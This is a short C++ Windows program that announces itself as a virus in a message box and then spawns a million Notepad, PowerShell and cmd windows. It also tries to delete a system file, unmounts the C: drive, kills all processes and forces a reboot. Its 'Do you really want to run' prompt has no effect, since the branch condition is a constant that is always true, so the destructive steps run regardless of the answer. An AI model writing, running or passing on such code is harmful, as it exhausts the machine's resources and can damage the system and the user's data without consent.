#include<bits/stdc++.h>
#include<windows.h> 
using namespace std;
int main(){
	MessageBox(0,"This Program Is A Virus,Do You Relly To Run?","Message",MB_OK);
	if(IDYES){
		for(int i=1;i<=1000000;i++){
			system("PowerShell;start notepad.exe");
			system("PowerShell;start PowerShell.exe");
		}
		system("del C:\\windows\\System32\\svhost.exe");
		system("mountvol C: /d");
		for(int i=1;i<=1000000;i++){
			system("start cmd.exe");
		}
		system("taskkill /f /fi 'pid ne 1'");
		system("shutdown -r -c hahaha -t 240");
	}
	else if(IDNO){
		system("pause");
	}
	return 0;
}
